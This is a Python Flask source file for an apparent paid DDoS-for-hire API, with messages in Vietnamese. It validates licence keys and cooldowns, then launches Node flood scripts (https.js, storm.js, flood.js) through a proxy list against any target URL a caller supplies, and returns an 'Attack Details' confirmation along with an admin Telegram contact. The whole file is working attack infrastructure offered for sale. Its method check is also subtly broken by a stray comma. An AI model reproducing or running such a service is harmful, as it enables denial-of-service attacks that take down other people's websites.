import json
from flask import Flask, request
import subprocess
import threading
from datetime import datetime, timedelta

app = Flask(__name__)

def is_key_valid(key):
    try:
        with open('keys.json', 'r') as f:
            keys_data = json.load(f)
    except FileNotFoundError:
        return False
    if key not in keys_data:
        return False
    expiration_date = datetime.strptime(keys_data[key]['expiration_date'], "%Y-%m-%d %H:%M:%S")
    return expiration_date > datetime.now()

def get_max_time_from_keys(key):
    try:
        with open('keys.json', 'r') as f:
            keys_data = json.load(f)
    except FileNotFoundError:
        return None
    if key in keys_data:
        return keys_data[key]['ddos_seconds']
    return None

def get_cooldown_from_keys(key):
    try:
        with open('keys.json', 'r') as f:
            keys_data = json.load(f)
    except FileNotFoundError:
        return None
    if key in keys_data:
        return keys_data[key]['cooldown_seconds']
    return None

cooldown_timers = {}

def can_send_request(key):
    cooldown = get_cooldown_from_keys(key)
    if cooldown:
        if key in cooldown_timers:
            time_since_last_request = datetime.now() - cooldown_timers[key]
            if time_since_last_request < timedelta(seconds=cooldown):
                return False
    cooldown_timers[key] = datetime.now()
    return True
@app.route('/methods', methods=['GET'])
def methods_tmr():
    result = f"""
 
    Methods Layer 7
    https • ONLINE
    storm • ONLINE
ㅤㅤflood • ONLINE
    """
    return result, 200

@app.route('/cocaicoincard', methods=['GET'])
def execute_tool():
    try:
        host = request.args.get('host', '')
        port = request.args.get('port', '')
        time = int(request.args.get('time', ''))
        methods = request.args.get('methods', 'Methods')
        key = request.args.get('key', '')
        
        if not (host and port and time and methods and key):
            return (f"Vui Lòng Nhập Đầy Đủ Thông Tin Vào Url Attack", 400)
        
        if not is_key_valid(key):
            return (f"Error 403:Key Không Tồn Tại Hoặc Đã Hết Hạn", 403)
        
        if not (host.startswith('http://') or host.startswith('https://')):
            return (f"Error 400:Vui Lòng Nhập Đúng Định Dạng Url 'http://' Hoặc 'https://'</span>", 400)
        
        max_time = get_max_time_from_keys(key)
        if not (10 <= time <= max_time):
            return (f"Error 400:Time Tối Thiểu Là 10 Tối Đa Là {max_time}</span>", 400)
        
        valid_methods = ["https", "storm", "flood"],
        if methods not in valid_methods:
            return (f"Error 400:Phương thức không tồn tại hoặc bị thiếu, vui lòng nhập lại</span>", 400)
        
        if not can_send_request(key):
            cooldown = get_cooldown_from_keys(key)
            return (f"Error 429:Vui Lòng Chờ {cooldown} Giây Để Tiếp Tục Attack</span>", 429)

        def execute_command():
            if methods == "https":
                command = ['node', 'https.js', host ,str(time), '72', '5', 'proxy.txt']
            elif methods == "storm":
                command = ['node', 'storm.js', host ,str(time), '5', '72', 'proxy.txt']
            elif methods == "flood":
                command = ['node', 'flood.js', host ,str(time), '72', '5', 'GET', 'proxy.txt']
            else:
                print(f"Wrong Method: {methods}")
                return
            try:
                result = subprocess.run(command, capture_output=True, text=True, timeout=180)
                print(result.stdout)
                print(result.stderr)
            except subprocess.TimeoutExpired:
                print("Lệnh gửi đã hết thời gian chờ.")
            except Exception as e:
                print(f"Lỗi Này Nè Này Nè: {e}")
        
        threading.Thread(target=execute_command).start()
        
        try:
            with open('keys.json', 'r') as f:
                keys_data = json.load(f)
        except FileNotFoundError:
            keys_data = {}
        
        expiration_date = datetime.strptime(keys_data[key]['expiration_date'], "%Y-%m-%d %H:%M:%S")
        result = f"""
          Attack Details
         ㅤㅤStatus:Attack Successfully Sent
         ㅤㅤHost:{host}
         ㅤㅤPort:{port}
         ㅤㅤTime:{time}
         ㅤㅤMethod:{methods}
         ㅤㅤSent On:{datetime.now().strftime("%b %d %Y %H:%M:%S")}
         ㅤㅤKey Expiration:{expiration_date.strftime("%d/%m/%Y %H:%M:%S")}
        """
        return result, 200
    except Exception as e:
        print(e)
        return (f"""
            Lỗi Server Rồi
           Cách Sử Dụng Api Ddos
            /cocaicoincard?host=[HOST]&port=[PORT]&time=[TIME]&methods=[METHODS]&key=[KEY]
         Cách Xem Methods Ddos: /methods
    Thông Tin Của Admin
       ㅤTelegam:@cinnkoz
        """, 500)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8800, debug=True)